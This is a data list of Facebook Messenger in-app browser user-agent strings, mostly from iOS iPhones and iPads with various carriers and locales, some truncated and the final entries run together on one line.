Mozilla/5.0 (iPad; CPU OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPad5,4;FBMD/iPad;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBCR/Beeline;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466 [FBAN/MessengerForiOS;FBAV/19.1.0.12.23;FBBV/6318336;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.3;FBSS/2; FBCR/MobileTeleSystems;FBID/pho
Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/58.0.0.32.81;FBBV/22628760;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/ru_R
Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/47.0.0.19.116;FBBV/17056928;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/de_
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/55.0.0.28.59;FBBV/20754519;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B554a [FBAN/MessengerForiOS;FBAV/3.1.2;FBBV/1027309;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.4;FBSS/2; FBCR/MobileTeleSystems;FBID/phone;FB
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B511 [FBAN/MessengerForiOS;FBAV/9.1.0.15.14;FBBV/3594432;FBDV/iPhone3,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.3;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/ru
Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F70 [FBAN/MessengerForiOS;FBAV/85.0.0.22.69;FBBV/37013644;FBRV/0;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/99.0.0.31.139;FBBV/45331829;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Carrier;FBID/phone;FB
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Beeline;FBID/phone;FBLC/r
Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/50.0.0.15.72;FBBV/17975388;FBDV/iPad2,7;FBMD/iPad;FBSN/iPhone OS;FBSV/9.1;FBSS/1; FBCR/MobileTeleSystems;FBID/tablet;FBLC/ru_RU;
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/23.1.0.15.15;FBBV/8176219;FBDV/iPad4,4;FBMD/iPad;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/1]
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/15.0.0.15.14;FBBV/4974699;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/64.0.0.28.84;FBBV/26403168;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/
Mozilla/5.0 (iPad; CPU OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/88.0.0.27.69;FBBV/38853002;FBRV/0;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/br_pt;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/25.0.0.4.14;FBBV/8936291;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/120.0.0.48.70;FBBV/59774553;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Rogers;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/123.0.0.44.69;FBBV/62323340;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/128.0.0.43.90;FBBV/66013621;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B440 [FBAN/MessengerForiOS;FBAV/34.0.0.21.276;FBBV/13810118;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.2;FBSS/2; FBCR/Globe;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/13.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/113.0.0.38.70;FBBV/54935425;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Ooredoo;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C101 [FBAN/MessengerForiOS;FBAV/196.0.0.54.99;FBBV/135382157;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1.2;FBSS/3;FBCR/CELCOM;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/TRUE-H;FBID/phone;FBLC/th_TH;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/190.1.0.58.95;FBBV/129822925;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/pl_PL;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/200.0.0.27.103;FBBV/139866222;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Telcel;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBCR/Free;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iOS;FBSV/13.2.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBDV/iPad3,4;FBMD/iPad;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/2;FBID/phone;FBLC/zh_TW;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad11,3;FBMD/iPad;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBDV/iPad6,12;FBMD/iPad;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.1.3;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/cs_CZ;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.1;FBSS/2;FBID/phone;FBLC/nb_NO;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/12.3.1;FBSS/2;FBID/phone;FBLC/pl_PL;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/243.0.0.43.118;FBBV/185083733;FBDV/iPad5,3;FBMD/iPad;FBSN/iOS;FBSV/13.1.3;FBSS/2;FBID/tablet;FBLC/es_ES;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/143552906]
Mozilla/5.0 (iPad; CPU iPad OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/MessengerForiOS;FBAV/142.0.0.38.63;FBBV/77803202;FBDV/iPad8,4;FBMD/iPad;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/NOS;FBID/phone;FBLC/jv_ID;FBOP/5;FBRV/77803202]
Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/pt_PT;FBOP/5;FBRV/0]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/MessengerForiOS;FBAV/147.0.0.50.87;FBBV/84235609;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBAV/177.0.0.38.75;FBBV/119094790;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E302 [FBAN/MessengerForiOS;FBAV/167.0.0.57.96;FBBV/109575372;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3.1;FBSS/2;FBCR/Movicel;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI Y625-U21 Build/HUAWEIY625-U21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/136.0.0.8.90;] Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBAV/154.0.0.37.96;FBBV/93159637;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/UNITEL;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E302 [FBAN/MessengerForiOS;FBAV/167.0.0.57.96;FBBV/109575372;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3.1;FBSS/3;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/160.0.0.49.95;FBBV/101168249;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0] Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) 